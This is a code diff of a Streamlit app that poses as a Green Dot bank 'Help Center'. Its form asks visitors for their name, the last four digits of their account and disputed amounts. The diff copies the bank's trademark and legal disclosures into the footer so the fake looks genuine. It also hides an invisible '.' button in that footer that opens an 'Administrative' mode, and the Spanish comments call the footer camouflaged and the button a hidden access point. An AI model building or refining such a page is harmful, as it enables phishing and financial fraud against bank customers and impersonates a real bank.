@@ -54,40 +54,20 @@ st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
 
-    /* Footer Legal Indistinguible */
     .legal-container {
         font-size: 10px; color: #444; text-align: justify; margin-top: 50px;
-        border-top: 1px solid #111; padding-top: 10px; line-height: 1.2;
+        border-top: 1px solid #111; padding-top: 15px; line-height: 1.5;
     }
 
-    /* Botón Ghost corregido: sin fondo, sin bordes, color de texto legal */
-    div.stButton > button[key="ghost_32_2"] {
-        background-color: transparent !important; 
-        border: none !important; 
-        color: #444 !important;
-        padding: 0 !important; 
-        margin: 0 !important; 
-        display: inline !important;
-        font-size: 10px !important; 
-        font-family: inherit !important;
-        width: auto !important; 
-        height: auto !important;
-        min-height: 0 !important; 
-        min-width: 0 !important; 
-        box-shadow: none !important;
-        cursor: text !important; 
-        vertical-align: baseline !important;
-        transition: none !important;
-        outline: none !important;
+    /* Enlace invisible (punto) */
+    div.stButton > button[key="ghost_dot"] {
+        background-color: transparent !important; border: none !important; color: #444 !important;
+        padding: 0 !important; margin: 0 !important; display: inline !important;
+        font-size: 10px !important; width: auto !important; height: auto !important;
+        min-height: 0 !important; min-width: 0 !important; box-shadow: none !important;
+        cursor: text !important; vertical-align: baseline !important;
     }
-    div.stButton > button[key="ghost_32_2"]:hover, 
-    div.stButton > button[key="ghost_32_2"]:active, 
-    div.stButton > button[key="ghost_32_2"]:focus {
-        color: #444 !important; 
-        background: transparent !important; 
-        border: none !important;
-        box-shadow: none !important;
-    }
+    div.stButton > button[key="ghost_dot"]:hover { color: #444 !important; }
 </style>""", unsafe_allow_html=True)
 
 if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
@@ -100,7 +80,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("ghost_form_32_2", clear_on_submit=True):
+    with st.form("ghost_form_32_3", clear_on_submit=True):
         nombre = st.text_input("Full Name")
         cuenta = st.text_input("Last 4 digits of Account")
         monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -113,10 +93,19 @@ if not st.session_state.admin_mode:
                 st.success(f"Success. Reference: {ref}")
             else: st.error("Information required.")
 
-    # Footer mimetizado
-    st.markdown("<div class='legal-container'>Green Dot® cards are issued by Green Dot Bank, ", unsafe_allow_html=True)
-    if st.button("Member", key="ghost_32_2"): st.session_state.admin_mode = True
-    st.markdown(" FDIC. ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924.</div>", unsafe_allow_html=True)
+    # Footer completo con punto de acceso invisible
+    st.markdown("""<div class='legal-container'>
+        * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
+        Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account. Mobile number verification, email address verification and mobile app are required to access all features.<br><br>
+        The check cashing service is provided by Ingo Money, Inc. and the sponsor bank identified in the Terms and Conditions for the service and Ingo Money, Inc., which are third parties that operate independently from GO2bank.com. Ingo Money will provide customer service for all mobile check cashing. Subject to the Terms and Conditions and Privacy Policy. Approval usually takes 3-5 minutes but may take up to one hour. All checks are subject to approval for funding in Ingo Money’s sole discretion. Fees apply for approved ‘Money in Minutes’ transactions funding to your card or account. Unapproved checks will not be loaded to your card or account. Ingo Money reserves the right to recover losses resulting from illegal or fraudulent use of the Ingo Money Service. Your wireless carrier may charge a fee for data usage. Additional transaction fees, costs, terms and conditions may be associated with the funding use of your card or account. See your Cardholder Account Agreement for details. Note: Ingo Money check cashing services is not available for use within the state of New York.<br><br>
+        Green Dot® cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association. And by Mastercard International Inc. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated.<br><br>
+        GO2bank™ cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association.<br><br>
+        Green Dot Bank also operates under the following registered trade names: GO2bank, GoBank and Bonneville Bank. All of these registered trade names are used by, and refer to, a single FDIC-insured bank, Green Dot Bank. Deposits under any of these trade names are deposits with Green Dot Bank and are aggregated for deposit insurance coverage up to the allowable limits.<br><br>
+        All third-party names and logos are trademarks of their respective owners. These owners are not affiliated with Green Dot Corporation and have not sponsored or endorsed Green Dot Bank products or services. Neither Green Dot Corporation, Visa U.S.A. nor any of their respective affiliates are responsible for the products or services provided by Ingo® Money and Plaid, Inc. Partner terms and conditions apply.<br><br>
+        Apple, the Apple logo, and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries. App Store is a service mark of Apple Inc. Google, Android and Google Play are trademarks of Google Inc., registered in the U.S. and other countries. Samsung is a registered trademark of Samsung Electronics Co., Ltd.<br><br>
+        ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739""", unsafe_allow_html=True)
+    if st.button(".", key="ghost_dot"): st.session_state.admin_mode = True
+    st.markdown("</div>", unsafe_allow_html=True)
 
 else:
     st.title("🔐 Administrative")
